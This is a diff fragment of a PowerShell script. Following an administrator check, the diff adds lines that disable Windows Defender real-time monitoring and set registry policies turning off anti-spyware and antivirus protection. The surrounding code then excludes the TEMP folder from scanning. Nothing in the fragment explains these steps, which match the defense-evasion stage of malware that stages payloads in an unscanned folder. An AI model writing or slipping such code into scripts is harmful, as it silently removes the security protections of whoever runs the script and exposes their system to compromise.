@@ -19,6 +19,12 @@ if (-not $isAdmin) {
     }
 }
 
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "Real-Time Protection" -ErrorAction SilentlyContinue
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force
+
 # ===== ADMIN: WORK =====
 $folder = $env:TEMP
 try { Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue } catch {}
